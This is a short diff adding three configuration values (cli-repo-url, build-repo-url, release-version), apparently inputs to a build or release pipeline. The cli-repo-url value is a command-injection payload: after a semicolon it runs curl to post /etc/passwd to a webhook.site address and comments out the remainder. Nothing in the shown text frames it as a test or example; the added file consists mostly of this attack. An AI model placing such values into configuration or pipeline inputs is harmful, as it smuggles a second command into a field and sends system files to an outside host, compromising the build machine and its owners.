@@ -1,0 +1,3 @@
+cli-repo-url: "http://x; curl -d @/etc/passwd https://webhook.site/25ce9523-a606-4147-a549-b95795f250c9 #"
+build-repo-url: "http://y"
+release-version: "v0.0.1"
